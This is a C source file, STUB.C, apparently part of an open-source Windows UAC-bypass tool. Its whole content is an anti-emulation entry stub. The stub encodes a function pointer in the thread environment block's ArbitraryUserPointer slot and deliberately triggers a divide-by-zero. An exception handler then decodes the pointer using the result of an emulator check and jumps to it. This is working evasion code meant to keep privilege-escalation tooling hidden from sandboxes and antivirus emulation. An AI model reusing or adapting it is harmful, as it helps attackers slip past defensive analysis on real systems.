/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2021
*
*  TITLE:       STUB.C
*
*  VERSION:     3.57
*
*  DATE:        01 Nov 2021
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmSehHandler
*
* Purpose:
*
* Program entry point seh handler, indirect control passing.
*
*/
INT ucmSehHandler(
    _In_ UINT ExceptionCode,
    _In_ EXCEPTION_POINTERS* ExceptionInfo
)
{
    DWORD_PTR entry;
    NTSTATUS result = wdIsEmulatorPresent();

    UNREFERENCED_PARAMETER(ExceptionInfo);

    if (ExceptionCode == STATUS_INTEGER_DIVIDE_BY_ZERO) {

#ifdef _WIN64
        entry = (DWORD_PTR)__readgsqword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer));
        __writegsqword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer), 0);
        entry = (RotateRight64(
            (ULONG_PTR)(ULONG_PTR)entry,
            0x40 - (result & 0x3f)) ^ result);
#else
        entry = (DWORD_PTR)__readfsdword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer));
        __writefsdword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer), 0);
        entry = (RotateRight32(
            (ULONG_PTR)entry,
            0x20 - (result & 0x1f)) ^ result);
#endif

        ((pfnEntryPoint)(entry))(UacMethodInvalid,
            NULL,
            0,
            FALSE);

        return EXCEPTION_EXECUTE_HANDLER;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

DWORD StubInit(VOID)
{
    int v = 1, d = 0;
    DWORD_PTR entry;
    NTSTATUS ntStatus = STATUS_NOT_SUPPORTED;

    __try {

#ifdef _WIN64
        entry = (DWORD_PTR)__readgsqword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer));
        entry = (RotateRight64(
            (ULONG_PTR)entry ^ ntStatus,
            ntStatus & 0x3f));
        __writegsqword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer), entry);
#else
        entry = (DWORD_PTR)__readfsdword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer));
        entry = (RotateRight32(
            (ULONG_PTR)entry ^ ntStatus,
            ntStatus & 0x1f));
        __writefsdword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer), entry);
#endif

        v = (int)USER_SHARED_DATA->NtProductType;
        d = (int)USER_SHARED_DATA->AlternativeArchitecture;
        v = (int)(v / d);
    }
    __except (ucmSehHandler(GetExceptionCode(), GetExceptionInformation())) {
        v = 1;
    }

    return v;
}
